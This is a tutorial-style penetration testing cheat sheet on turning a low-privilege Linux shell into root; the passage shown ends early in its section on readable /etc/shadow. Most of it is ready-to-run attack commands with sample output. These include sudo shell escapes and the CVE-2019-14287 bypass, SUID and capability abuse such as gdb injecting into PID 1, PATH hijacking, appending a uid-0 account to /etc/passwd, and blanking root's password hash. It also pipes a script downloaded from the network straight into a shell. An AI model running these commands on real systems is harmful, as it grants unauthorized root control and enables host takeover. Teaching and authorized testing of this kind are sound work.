# Linux Privilege Escalation

> **⚠️ AUTHORIZED USE ONLY.** For education and authorized testing only. Every technique here ends with full control of a host. Use them only on systems you own or that are explicitly in scope. See the [Legal and Terms of Use](/legal) page.

**Scope:** taking a low privilege shell on a Linux host and turning it into root. Enumeration first, then the misconfigurations that actually appear in client environments, then how to fix each one.

**Recommended background:** the Linux command line, file permissions and the `rwx` bits, users and groups, processes, and enough shell to read a script. If `chmod 644` or `ps aux` are unfamiliar, cover those first.

**Conventions:** `$` at the start of a shell prompt means you are a normal user. `#` means you are root. `2>/dev/null` appears on most enumeration commands to throw away the thousands of "Permission denied" errors you will otherwise get, so only useful results reach your screen.

## Table of Contents
- [Quick Reference](#quick-reference)
- [How Privilege Escalation Works](#how-privilege-escalation-works)
- [Enumerating the System](#enumerating-the-system)
- [Automated Enumeration](#automated-enumeration)
- [Kernel Exploits](#kernel-exploits)
- [Misconfigured sudo](#misconfigured-sudo)
- [SUID and SGID Binaries](#suid-and-sgid-binaries)
- [Linux Capabilities](#linux-capabilities)
- [PATH Hijacking](#path-hijacking)
- [Weak File and Directory Permissions](#weak-file-and-directory-permissions)
- [Cron Jobs and Scheduled Tasks](#cron-jobs-and-scheduled-tasks)
- [Wildcard Injection](#wildcard-injection)
- [LD_PRELOAD and Shared Object Hijacking](#ld_preload-and-shared-object-hijacking)
- [Credential Hunting](#credential-hunting)
- [Cracking What You Find](#cracking-what-you-find)
- [Privileged Group Membership](#privileged-group-membership)
- [Services Running as Root](#services-running-as-root)
- [NFS no_root_squash](#nfs-no_root_squash)
- [Escaping Restricted Shells](#escaping-restricted-shells)
- [Container Awareness](#container-awareness)
- [Proving Access and Cleaning Up](#proving-access-and-cleaning-up)
- [Prevention](#prevention)
- [Detection and Response](#detection-and-response)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

---

## 1. Quick Reference

**Skim this now, return to it later.** Every command here is explained properly in the section noted beside it. This page exists so that once you know the material, you do not have to hunt for the syntax.

```bash
id                                              # who am I, which groups   (Section 3)
sudo -l                                         # what may I run as root   (Section 6)
uname -r                                        # kernel version           (Section 5)
find / -perm -4000 -type f 2>/dev/null          # SUID binaries            (Section 7)
getcap -r / 2>/dev/null                         # capabilities             (Section 8)
cat /etc/crontab                                # scheduled root tasks     (Section 11)
ss -tulpn                                       # listening services       (Section 17)
find / -writable -type f 2>/dev/null            # files you can modify     (Section 10)
```

Those eight commands find most escalation paths. What you are looking for in each:

| Command | Boring result | Interesting result |
|---------|---------------|--------------------|
| `id` | Only your own group | `docker`, `lxd`, `disk`, `adm`, `shadow` |
| `sudo -l` | `not allowed to run sudo` | Any entry, especially `NOPASSWD` |
| `uname -r` | Current kernel | Kernel more than two years old |
| SUID hunt | `/bin/su`, `/bin/mount`, `/usr/bin/passwd` | `find`, `vim`, `python`, anything in `/usr/local/bin` |
| `getcap` | Empty | `cap_setuid`, `cap_dac_override`, `cap_sys_ptrace` |
| `/etc/crontab` | Default `cron.daily` lines | A script in `/opt` or `/home` |
| `ss -tulpn` | Ports 22, 80 | Services bound to `127.0.0.1` |
| Writable files | Files in your own home | Anything in `/etc`, `/opt`, `/usr/local` |

**Rule of thumb for time spent:** enumeration is ninety percent of privilege escalation. The exploit is usually five seconds of work once you have found the right thing.

---

## 2. How Privilege Escalation Works

**Why this section exists:** every technique in this sheet is a variation on one idea. If you understand the idea, you can recognise new variations instead of memorising a list.

### Linux decides what you can do by number, not by name

Every process carries user IDs. The kernel checks those numbers on every file access and every privileged operation.

| ID | Full name | What it is |
|----|-----------|------------|
| **uid** | Real user ID | Who started the process |
| **euid** | Effective user ID | **Who the kernel checks permissions against** |
| gid, egid | Group IDs | The same idea for groups |

`euid` is the one that matters. Root is `euid=0`. Nothing else is special about it: there is no separate "admin mode", just the number zero.

```bash
id
```

```
uid=1000(mrb3n) gid=1000(mrb3n) euid=0(root) groups=1000(mrb3n)
```

`uid=1000` but `euid=0` means you started as `mrb3n` and the kernel is currently treating you as root. **For reading `/etc/shadow` or writing to `/etc/passwd`, that is already enough.** You do not need the `uid` to change too.

### There are only three ways to reach euid 0

Every section that follows is one of these three.

| Route | Mechanism | Sections |
|-------|-----------|----------|
| **Ask something that is already root** | A root process does what you tell it | sudo (6), cron (11), root services (17) |
| **Become root legitimately** | A mechanism designed to raise privileges, misconfigured | SUID (7), capabilities (8), groups (16) |
| **Break the kernel** | A bug lets you set your own euid | Kernel exploits (5) |

So when you enumerate, you are answering three questions: *what runs as root and listens to me*, *what raises privileges and is set up badly*, and *how old is this kernel*.

### Why injecting into a root process works

When a root process runs a command, that command inherits root. The root process does not check who wrote the script it runs, only that it can read it.

```
root's cron  ->  runs /opt/backup.sh  ->  the script's commands run as root
                 ^
                 you can write this file
```

That is Section 11 in one diagram, and it is also Sections 9, 12, 13, and 17 with a different file in the middle.

---

## 3. Enumerating the System

**What you are building:** a picture of the host before you touch anything. Two minutes here saves an hour of guessing.

### Start with yourself

```bash
id
whoami
groups
```

```
uid=1000(mrb3n) gid=1000(mrb3n) groups=1000(mrb3n),4(adm),999(docker)
```

**Read this carefully.** `adm` lets you read every log file on the box. `docker` is root by another name, see Section 16. The single most common mistake is scrolling past this line.

### Host and kernel

```bash
uname -a          # everything: kernel, version, architecture, build date
uname -r          # just the release string, which is what exploit searches need
cat /etc/os-release
```

```
Linux web01 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
```

| Piece | Meaning |
|-------|---------|
| `web01` | Hostname |
| `4.4.0-116-generic` | Kernel version, feeds Section 5 |
| `#140-Ubuntu SMP Mon Feb 12 2018` | **Build date.** A 2018 kernel on a live host is years of unpatched bugs |
| `x86_64` | Architecture, decides which exploit binary you compile |

The build date is the fastest signal. If it is old, run Section 5 before anything else.

### Who else lives here

```bash
cat /etc/passwd | grep -vE "nologin|false"
```

`/etc/passwd` lists every account. `grep -vE "nologin|false"` removes the ones that cannot log in, because `-v` inverts the match and `-E` allows the `|` alternation. What is left is accounts a human or a service actually uses.

```
root:x:0:0:root:/root:/bin/bash
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
backupsvc:x:1001:1001::/home/backupsvc:/bin/bash
```

**Why `backupsvc` is interesting:** service accounts with a real shell were created by an administrator for a job. Their password is often written into a config file or a script, which makes them a stepping stone (Section 14).

The `x` in the second field means the hash lives in `/etc/shadow` instead. If you ever see a hash there directly, that account can be cracked without root access.

### What is running

```bash
ps aux | grep -i root
```

`ps aux` lists every process with its owner. Filtering for root shows you what has privileges worth stealing.

```
root      1123  /usr/local/bin/payroll-sync --config /opt/payroll/db.conf
root      1455  /usr/sbin/mysqld
```

| Observation | Why it matters |
|-------------|----------------|
| `/usr/local/bin/payroll-sync` | Not a distro package. Custom code, rarely reviewed, often world-writable |
| `--config /opt/payroll/db.conf` | **A config file path handed to you.** Read it, it probably holds credentials |
| `mysqld` as root | A database running as root can write files as root (Section 17) |

Anything under `/opt` or `/usr/local` deserves your attention. Distro binaries in `/usr/bin` are audited by thousands of people, in-house scripts are not.

### What is listening

```bash
ss -tulpn
```

| Flag | Meaning |
|------|---------|
| `-t` | TCP |
| `-u` | UDP |
| `-l` | Only listening sockets |
| `-p` | Show the process that owns the socket |
| `-n` | Numeric ports, do not translate 22 into "ssh" |

```
LISTEN 0 128 127.0.0.1:8080  0.0.0.0:*  users:(("java",pid=2231))
LISTEN 0 128 127.0.0.1:3306  0.0.0.0:*
LISTEN 0 128 0.0.0.0:22      0.0.0.0:*
```

| Address | Meaning |
|---------|---------|
| `0.0.0.0:22` | Reachable from the network. Already scanned, already hardened |
| `127.0.0.1:8080` | **Only reachable from inside this host** |

Services bound to localhost were never expected to face an attacker, so they are frequently unauthenticated or running an old version. You have a shell, so you are inside. Forward the port to your own machine to use browser tools against it:

```bash
ssh -L 8080:127.0.0.1:8080 mrb3n@10.10.10.5
```

`-L` means local forward. Traffic to port 8080 on your machine is tunnelled through SSH and delivered to `127.0.0.1:8080` on the target, so `http://localhost:8080` in your browser now reaches it.

### Get a usable shell first

A shell from a reverse connection has no terminal attached, so `sudo`, `su`, `vi`, and Ctrl+C all misbehave. Fix it before continuing.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

`pty.spawn` starts bash attached to a pseudo-terminal, which is the thing a real login has and your shell does not.

```bash
# press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
```

`stty raw -echo` tells your own terminal to stop processing keystrokes and pass them straight through, so Ctrl+C reaches the target instead of killing your listener. `fg` brings the shell back. `TERM=xterm` makes `vi` and `less` work.

---

## 4. Automated Enumeration

**What these tools are:** scripts that run hundreds of enumeration checks and flag the results. They do not exploit anything. They save you typing, and they catch things you would forget.

**Why you still do Section 3 by hand:** the tools check known patterns. Custom in-house scripts, an odd config file, an internal service, none of those match a known pattern. The tools also produce thousands of lines, and you will only recognise the important ones if you already know what they mean.

### LinPEAS

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

| Piece | What it does |
|-------|--------------|
| `curl -L <url>` | Downloads the script. `-L` follows redirects, which GitHub release links always use |
| `\|` | Pipes the downloaded text into the next command instead of saving it |
| `sh` | Executes the piped text |

**Nothing touches disk.** The script exists only in memory, which matters when the host has file integrity monitoring or antivirus. The trade-off is that you need outbound internet from the target, which most client environments do not allow.

**The safer version for real engagements:** transfer the file yourself, run it, keep the output.

```bash
./linpeas.sh -a > /dev/shm/peas.txt 2>&1
```

| Piece | What it does |
|-------|--------------|
| `-a` | All checks, including the slow ones |
| `> /dev/shm/peas.txt` | Send normal output to a file |
| `2>&1` | Send error output to the same place, so nothing is lost |
| `/dev/shm` | **Shared memory, not disk.** Writable by everyone, and cleared on reboot |

Use `/dev/shm` or `/tmp` for tooling. Both are writable by normal users. Never drop tools into a user's home directory, where an administrator will find them next week.

### Reading the output

LinPEAS colours results by confidence, and you should read the colours rather than the 4000 lines.

| Colour | Meaning |
|--------|---------|
| **Red background, yellow text** | 95 percent chance this is a working escalation path |
| Red | Interesting, worth checking |
| Yellow | Might matter in context |
| Green | Normal, ignore |

```bash
grep -aiE "95%|writable|SUID|NOPASSWD" /dev/shm/peas.txt | head -40
```

`-a` treats the file as text even though colour codes make it look binary. `-i` ignores case. `-E` allows the `|` alternation.

### Linux Exploit Suggester

```bash
./linux-exploit-suggester.sh
```

It reads your kernel version and compares it against a database of public exploits.

```
[+] [CVE-2017-16995] eBPF_verifier
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39)-generic}
   Download URL: https://www.exploit-db.com/download/45010
```

| Field | How to read it |
|-------|----------------|
| `CVE-2017-16995` | The identifier to search for |
| `Exposure: highly probable` | The tool's confidence. `less probable` usually means the version is close but not exact |
| `Tags` | **Which distro and kernel the exploit was actually tested on.** If yours is not listed, expect to debug it |
| `Download URL` | Source code |

**Confidence is not a guarantee.** The tool only compares version numbers. It cannot see whether the vendor backported a security fix without changing the version string, which Red Hat and Ubuntu LTS do constantly. Verify before you run anything, see Section 5.

### LinEnum

```bash
./LinEnum.sh -t -r report -e /dev/shm/
```

| Flag | Meaning |
|------|---------|
| `-t` | Thorough. Adds the slower checks |
| `-r report` | Write a report file with that name |
| `-e /dev/shm/` | Export interesting files it finds into that directory |

LinEnum produces plainer output than LinPEAS and is easier to read in a dumb shell with no colour support.

### pspy

```bash
./pspy64 -pf -i 1000
```

pspy watches processes as they start, **without needing root**. It works by watching kernel filesystem events on `/proc`, which any user may do.

| Flag | Meaning |
|------|---------|
| `-p` | Print process events |
| `-f` | Print file system events too |
| `-i 1000` | Poll every 1000 milliseconds |

This is the only reliable way to see cron jobs you are not allowed to read, see Section 11. Leave it running for a few minutes while you work through other sections.

---

## 5. Kernel Exploits

**What it is:** a bug in the kernel itself that lets an unprivileged process gain privileges it was never granted. The kernel is the component that enforces every permission check, so a bug there bypasses all of them at once.

**Why it is last on the list in practice:** a failed kernel exploit can panic the host. On a client engagement that is an outage you caused. Exhaust configuration issues first, and when you do use one, tell the client beforehand.

### Step 1: establish the version

```bash
uname -r
cat /etc/os-release
```

```
4.4.0-116-generic
NAME="Ubuntu"
VERSION="16.04.4 LTS (Xenial Xerus)"
```

You need both. Distributions backport security fixes into old kernel versions, so `4.4.0` on Ubuntu 16.04 is not the same code as `4.4.0` on Debian.

### Step 2: find a matching exploit

```bash
searchsploit "Linux Kernel 4.4.0 Ubuntu 16.04"
```

`searchsploit` is an offline copy of Exploit-DB, included in Kali. It searches titles, so keep the terms close to how exploits are named.

```
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04) - 'snapd' Local Privilege Escalation | linux/local/46361.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation        | linux/local/44298.c
```

Read the version operator. `< 4.4.0-116` means **below** 116. You are on 116 exactly, so that one is already patched. This is the most common mistake in kernel exploitation.

```bash
searchsploit -m 44298
```

`-m` mirrors a copy into your current directory.

### Step 3: read it before you run it

```bash
head -40 44298.c
```

Exploit code from the internet runs with the privileges you are trying to gain. Check three things:

| Check | Why |
|-------|-----|
| Which kernels the comments claim | Confirms the match |
| Whether it contains a network address | Exploits that phone home are backdoored |
| What it does on success | Some spawn a shell, some add a user, some only set a SUID bit |

### Step 4: compile and run

```bash
gcc -o /dev/shm/exp 44298.c
chmod +x /dev/shm/exp
/dev/shm/exp
```

If `gcc` is missing on the target, compile on a machine with the **same architecture and a similar libc version**, then transfer the binary. A binary built against newer glibc will not run on an older host.

```
[.] starting
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] got root
# id
uid=0(root) gid=0(root) groups=0(root)
```

The prompt changed from `$` to `#` and `uid=0`. That is root.

### The ones worth recognising by name

| CVE | Name | Affects | What it abuses |
|-----|------|---------|----------------|
| CVE-2016-5195 | **DirtyCOW** | Kernel 2.6.22 to 4.8.3 | A race in copy-on-write memory lets you write to files you may only read |
| CVE-2022-0847 | **Dirty Pipe** | Kernel 5.8 to 5.16.11 | Uninitialised pipe buffer flags let you overwrite any readable file |
| CVE-2021-4034 | **PwnKit** | polkit, almost every distro before Jan 2022 | `pkexec` mishandles zero arguments and reads attacker-controlled environment |
| CVE-2021-3156 | **Baron Samedit** | sudo 1.8.2 to 1.9.5p1 | Heap overflow in sudo's argument parsing |

**Why DirtyCOW and Dirty Pipe matter conceptually:** neither gives you a root shell directly. Both give you an arbitrary file write, and you turn that into root by writing to `/etc/passwd` (Section 10). Learn the primitive, not the script.

PwnKit needs no compilation to check for:

```bash
ls -la /usr/bin/pkexec
```

```
-rwsr-xr-x 1 root root 30488 May 26  2021 /usr/bin/pkexec
```

The `s` in `-rwsr-xr-x` is the SUID bit (Section 7). If `pkexec` is present and SUID and the system was not patched after January 2022, it is vulnerable.

---

## 6. Misconfigured sudo

**What sudo is:** a program that lets specific users run specific commands as another user, normally root. The rules live in `/etc/sudoers`. It exists so an administrator can grant "restart the web server" without granting everything.

**Why it goes wrong:** the rule grants a program, but many programs can run other programs. Granting `vim` grants a root shell, because `vim` can run shell commands. The administrator almost never intends this.

### The single highest value command on the box

```bash
sudo -l
```

`-l` lists what your rules allow. It does not run anything.

```
Matching Defaults entries for mrb3n on web01:
    env_reset, env_keep+=LD_PRELOAD, secure_path=/usr/sbin:/usr/bin

User mrb3n may run the following commands on web01:
    (ALL) NOPASSWD: /usr/bin/awk
    (root) /usr/bin/openssl
    (ALL, !root) /bin/bash
```

Read it field by field:

| Text | Meaning |
|------|---------|
| `(ALL)` | You may run it as any user, which includes root |
| `NOPASSWD:` | **No password required.** You do not need to know the account's password |
| `(root)` | You may run it as root specifically |
| `(ALL, !root)` | Any user **except** root. An attempt to block root, see below |
| `env_reset` | Your environment variables are cleared before the command runs |
| `env_keep+=LD_PRELOAD` | **Except this one, which is kept.** A serious bug, see Section 13 |
| `secure_path=...` | sudo uses this fixed PATH, so your PATH cannot be hijacked (Section 9) |

That single output contains three separate escalation paths.

### Turning an allowed binary into a shell

**The principle:** if the program can start another program, read any file, or write any file, then running it as root gives you root. [GTFOBins](https://gtfobins.github.io/) catalogues the exact syntax for hundreds of binaries. Look up the binary name and read the `sudo` section.

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**How it works:** `awk` is a text processing language. `BEGIN { }` is a block that runs before any input is read, so you do not need to give it a file. `system()` runs a shell command. Since `awk` is running as root, so does the shell it starts.

```
root@web01:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The same idea in the binaries you will meet most often:

```bash
sudo find / -exec /bin/bash \; -quit
```

`-exec` runs a command for each result and `-quit` stops after the first, so it does not spawn hundreds of shells. `\;` ends the `-exec` argument and the backslash stops your shell from eating the semicolon.

```bash
sudo vim -c ':!/bin/bash'
```

`-c` runs a vim command at startup. Inside vim, `:!` runs a shell command.

```bash
sudo less /etc/profile
# then type:  !/bin/bash
```

Pagers run shell commands with `!`. This works for `less`, `more`, `man`, and `journalctl`, because they all use the same pager code. **This is why `sudo journalctl` is a root shell**, which surprises most administrators who grant it for log reading.

### When the binary cannot spawn a shell

Some binaries only read or write files. That is still enough.

```bash
sudo openssl enc -in /etc/shadow
```

`enc` is the encryption subcommand. With no cipher and no key it just reads the file and prints it. You have read a root-only file without ever getting a shell.

```bash
sudo tee -a /root/.ssh/authorized_keys < /tmp/mykey.pub
```

`tee` writes its input to a file, `-a` appends rather than replacing. Your public key is now trusted for root logins, so `ssh root@host` works. Appending matters: replacing the file would break the client's existing access.

**Map the capability to the outcome:**

| What the binary can do | What you get |
|------------------------|--------------|
| Run a command | Direct root shell |
| Read any file | `/etc/shadow` to crack, SSH keys, application secrets |
| Write any file | Add an SSH key, add a user to `/etc/passwd`, edit `/etc/sudoers` |

### CVE-2019-14287: the `!root` bypass

An entry like `(ALL, !root) /bin/bash` is an administrator trying to say "run bash as anyone except root". On sudo before 1.8.28 the check can be skipped.

```bash
sudo -V | head -1
```

```
Sudo version 1.8.21p2
```

```bash
sudo -u#-1 /bin/bash
```

| Piece | What it does |
|-------|--------------|
| `-u` | Run as this user |
| `#` | The following value is a numeric ID, not a name |
| `-1` | An invalid user ID |

sudo's blocklist checks the **name** `root`, and `-1` is not that name, so the rule passes. The conversion from `-1` to an actual ID then wraps around and lands on `0`, which is root.

```
root@web01:~# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

Note `gid` stayed at 1000. `uid=0` is what matters.

---

## 7. SUID and SGID Binaries

**What SUID is:** a permission bit that makes a program run with the privileges of the file's **owner** instead of the user who launched it. The bit exists for a real reason. `passwd` needs to write `/etc/shadow`, which only root may do, so `passwd` is owned by root and carries the SUID bit.

**Why it becomes a vulnerability:** the bit makes no distinction between a program written for this and a program that was not. A root-owned SUID `find` gives every user on the system root, because `find` can run commands.

### Finding them

```bash
find / -perm -4000 -type f 2>/dev/null
```

| Piece | What it does |
|-------|--------------|
| `/` | Search the whole filesystem |
| `-perm -4000` | Permission bits including `4000`, which is SUID. The leading `-` means "at least these bits" |
| `-type f` | Regular files only, skip directories and links |
| `2>/dev/null` | Discard the permission errors from directories you cannot enter |

For SGID, which does the same thing for the owning **group**, use `-perm -2000`.

```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

Adding `-exec ls -la {} \;` shows the owner and permissions of each result, which you need in order to judge them. `{}` is replaced by each filename.

```
-rwsr-xr-x 1 root root   44664 /bin/su
-rwsr-xr-x 1 root root   40152 /usr/bin/chsh
-rwsr-sr-x 1 root root  109432 /usr/bin/find
-rwsr-xr-x 1 root root    8472 /usr/local/bin/suid-backup
```

Reading the permission string:

| String | Meaning |
|--------|---------|
| `-rws` | The `s` replaces the owner's `x`. **SUID is set** |
| `-rwsr-s` | An `s` in the group position too. SGID as well |
| `1 root root` | Owned by user root, group root. SUID plus root owner is what matters |

Triage the list:

| Binary | Verdict |
|--------|---------|
| `/bin/su`, `/usr/bin/passwd`, `/bin/mount`, `/usr/bin/chsh` | Normal. These ship SUID on every distro |
| `/usr/bin/find` | **Not normal.** Someone set this bit by hand |
| `/usr/local/bin/suid-backup` | **Not normal.** Custom binary, not from a package |

### Exploiting it, and the `-p` trap

```bash
find /home -exec /bin/bash -p \; -quit
```

**The `-p` flag is the part people get wrong.** Bash deliberately drops elevated privileges at startup as a safety measure, so without `-p` you get a shell back as your normal user and conclude the technique failed. `-p` tells bash to keep the effective user ID it was given.

```
bash-4.4# id
uid=1000(mrb3n) gid=1000(mrb3n) euid=0(root) groups=1000(mrb3n)
```

`uid` is still 1000, `euid` is 0. As covered in Section 2, `euid` is what the kernel checks, so you can now read `/etc/shadow` and write anywhere.

Other binaries you will find SUID, and what each gives you:

```bash
# python: ask for a shell that keeps privileges
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'

# cp: overwrite a system file with your own version
cp /tmp/passwd_with_my_user /etc/passwd

# vim or nano: edit root-only files directly
nano /etc/shadow

# base64: read any file, since encoding it requires reading it
base64 /etc/shadow | base64 -d
```

`base64` is a good example of the mindset. It cannot run commands, so it looks harmless. It reads files, which is all you need.

### Reversing a custom SUID binary

For `/usr/local/bin/suid-backup` there is no GTFOBins entry, so you look at what it does.

```bash
strings /usr/local/bin/suid-backup
```

`strings` prints readable text found inside a binary, which usually includes the commands it runs and the files it opens.

```
setuid
system
/bin/tar -czf /backup/home.tgz /home
tar -czf /backup/home.tgz /home
```

| Line | What it tells you |
|------|-------------------|
| `setuid` | It raises privileges deliberately |
| `system` | It runs shell commands, so there is a command string to find |
| `/bin/tar ...` | An absolute path. Safe, the binary is fixed |
| `tar -czf ...` | **No path.** It searches your PATH to find `tar`, and you control your PATH |

That second form is the vulnerability, and Section 9 is how you use it.

```bash
ltrace /usr/local/bin/suid-backup 2>&1 | head -20
```

`ltrace` shows library calls as the program runs, which confirms what `strings` only suggested.

```
setuid(0)                    = 0
system("tar -czf /backup/home.tgz /home")
```

---

## 8. Linux Capabilities

**What capabilities are:** root's powers split into about forty separate pieces, so a program can be given exactly the one it needs instead of all of them. `ping` needs to craft raw network packets and nothing else, so it gets `cap_net_raw` instead of the SUID bit.

**Why they are a privilege escalation path:** they are designed to be safer than SUID, and they are, when the right one is chosen. Give a program `cap_setuid` and it can simply declare itself root. Capabilities are also easy to miss, because a binary with capabilities looks completely ordinary in `ls -la`.

### Finding them

```bash
getcap -r / 2>/dev/null
```

`-r` recurses. Without it, `getcap` checks only the path you name.

```
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/vim.basic = cap_dac_override+eip
/usr/bin/tar = cap_dac_read_search+ep
/usr/bin/gdb = cap_sys_ptrace+ep
```

The suffix after `+` is the capability set:

| Letter | Meaning |
|--------|---------|
| `e` | Effective. **Active as soon as the program starts** |
| `p` | Permitted. The program may enable it |
| `i` | Inheritable. Passed to programs it launches |

`+ep` is what you want to see. It means the power is live without the program doing anything.

### What each dangerous capability gives you

| Capability | What it permits | Result |
|------------|-----------------|--------|
| `cap_setuid` | Change the process user ID to anything | Direct root |
| `cap_dac_override` | **Ignore all file permission checks** | Write any file |
| `cap_dac_read_search` | Ignore read and directory permission checks | Read any file |
| `cap_sys_ptrace` | Attach to and control other processes | Inject code into a root process |
| `cap_sys_admin` | A grab bag including mounting filesystems | Effectively root |

### cap_setuid

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

`os.setuid(0)` asks the kernel to set this process's user ID to 0. Normally the kernel refuses. With `cap_setuid` it agrees. `os.system` then starts bash, which inherits the new ID.

```
root@web01:~# id
uid=0(root) gid=0(root) groups=0(root)
```

This is a full `uid=0`, not just `euid`, because the process genuinely changed identity.

The same in perl, which is often present when python is not:

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### cap_dac_override

This does not make you root. It makes the kernel skip permission checks on files, which is enough to create root.

```bash
vim.basic /etc/passwd
```

You can now edit `/etc/passwd` even though it is owned by root and read-only to you. Add an account with `uid` 0, as in Section 10.

Non-interactively, which matters in a dumb shell:

```bash
vim.basic -c ':%s/^root:[^:]*:/root::/' -c ':wq' /etc/shadow
```

| Piece | What it does |
|-------|--------------|
| `-c` | Run a vim command |
| `:%s/old/new/` | Substitute on every line |
| `^root:[^:]*:` | Matches `root:` followed by the hash field |
| `root::` | Replaces it with an **empty** hash |

An empty second field in `/etc/shadow` means no password. `su root` then logs in with nothing.

### cap_dac_read_search

Read-only, so you cannot write a backdoor. You can read `/etc/shadow` and crack it (Section 15), or steal root's SSH key.

```bash
tar -cvf /tmp/s.tar /etc/shadow && tar -xvf /tmp/s.tar -O
```

`tar` reads the file into an archive using its capability, then `-O` extracts to standard output so it prints rather than writing to disk.

### cap_sys_ptrace

`ptrace` is how debuggers control other processes. With this capability you can attach to a process owned by root and make it run your code.

```bash
gdb -p 1 -ex 'call (int)system("/bin/bash -c \"chmod +s /bin/bash\"")' -ex quit
```

| Piece | What it does |
|-------|--------------|
| `-p 1` | Attach to PID 1, which is always root |
| `-ex` | Run a gdb command |
| `call (int)system(...)` | Call the C `system()` function **inside that root process** |
| `chmod +s /bin/bash` | Set the SUID bit on bash |

```bash
/bin/bash -p
```

You did not become root. You made a root process run `chmod` for you, which is the Section 2 pattern again.

---

## 9. PATH Hijacking

**What PATH is:** an environment variable holding a list of directories. When you type `tar`, the shell walks that list in order and runs the first `tar` it finds.

**Why it is a vulnerability:** if a privileged program calls another program **by name instead of by full path**, it performs the same search, using whatever PATH it inherited. Control the PATH, control which file gets executed as root.

### Confirm the relative call

From Section 7 you already know `suid-backup` runs `tar` with no path.

```bash
strings /usr/local/bin/suid-backup | grep -E "tar|service|cat|ps"
```

```
tar -czf /backup/home.tgz /home
```

No leading `/`. That is the whole vulnerability.

### Build the replacement

```bash
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar
```

| Line | Why |
|------|-----|
| `#!/bin/bash` | The shebang. Tells the kernel which interpreter runs this file |
| `/bin/bash -p` | Starts a shell that keeps elevated privileges, as in Section 7 |
| `chmod +x` | Without the execute bit the kernel will not run it |

The file is named `tar` because that is the name being searched for.

### Put your directory first

```bash
export PATH=/tmp:$PATH
echo $PATH
```

```
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin
```

**Order is everything.** `/tmp` is now searched before `/bin`, so `/tmp/tar` wins. `export` makes the variable pass to programs you launch, which is the point: `suid-backup` inherits it.

```bash
/usr/local/bin/suid-backup
```

```
bash-4.4# whoami
root
```

### Check your own PATH for the same flaw

```bash
echo $PATH
```

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:.
```

The trailing `.` means the current directory is in the search path. If an administrator runs `ls` while sitting in a directory you can write to, your `ls` runs as root. This is a finding on its own even if you cannot exploit it during the test.

An empty entry has the same effect, and is easier to miss:

```
/usr/bin::/bin
```

The `::` is an empty element, and an empty element means the current directory.

---

## 10. Weak File and Directory Permissions

**What this covers:** files whose contents decide who is privileged, left writable by people who are not. No exploit code, no race condition, just permissions that should never have been set.

### Finding writable files

```bash
find / -writable -type f 2>/dev/null | grep -vE "^/(proc|sys|dev|run)"
```

`-writable` tests whether **you** can write the file, accounting for your user and all your groups. The `grep -v` removes the virtual filesystems, which are writable by design and produce thousands of useless lines.

Writable directories matter too, and are missed more often:

```bash
find / -perm -o+w -type d 2>/dev/null | grep -vE "^/(proc|sys|tmp|var/tmp|dev)"
```

`-perm -o+w` means the "other" write bit is set, so every user on the system can write there.

**Why a writable directory is as good as a writable file:** deleting a file requires write permission on its **directory**, not on the file. If `/opt/scripts` is writable, you can delete `backup.sh` and create your own, even though `backup.sh` is owned by root and read-only.

### Check the files that define privilege

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab
```

```
-rw-rw-r-- 1 root root 2891 Mar  8 11:02 /etc/passwd
-rw-r--r-- 1 root shadow 1387 Mar  8 11:02 /etc/shadow
```

| File | Correct permissions | What is wrong above |
|------|--------------------|--------------------|
| `/etc/passwd` | `644 root:root` | `664`. **Group writable**, and everyone is in some group |
| `/etc/shadow` | `640 root:shadow` | `644`. **World readable**, see Section 15 |
| `/etc/sudoers` | `440 root:root` | |

### Writable /etc/passwd

**What the file is:** the account list. Seven colon-separated fields per line.

```
root:x:0:0:root:/root:/bin/bash
 1   2 3 4  5     6      7
```

| Field | Contents |
|-------|----------|
| 1 | Username |
| 2 | Password field. `x` means "the hash is in `/etc/shadow`" |
| 3 | **uid. Zero is root** |
| 4 | gid |
| 5 | Comment |
| 6 | Home directory |
| 7 | Login shell |

**The legacy behaviour you are abusing:** field 2 used to hold the hash directly, before `/etc/shadow` existed. Linux still honours a hash placed there, and it takes priority over `/etc/shadow`. So writing to `/etc/passwd` lets you create a root account without ever touching the shadow file.

Generate a hash:

```bash
openssl passwd -1 -salt hack Password123
```

| Flag | Meaning |
|------|---------|
| `passwd` | The password hashing subcommand |
| `-1` | Use MD5-crypt, the format Linux recognises from the `$1$` prefix |
| `-salt hack` | Fix the salt so the output is predictable. Any value works |

```
$1$hack$Z1kJUZNxiF5LWQKtLqvJp0
```

Add the account:

```bash
echo 'hacker:$1$hack$Z1kJUZNxiF5LWQKtLqvJp0:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Use `>>` and not `>`.** A single `>` replaces the entire file, which deletes every account on the system and takes the host down. This is the most damaging mistake in this sheet.

The username is `hacker` but the uid is `0`, and Section 2 explained that the kernel only looks at the number.

```bash
su hacker
```

```
Password: Password123
root@web01:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Readable /etc/shadow

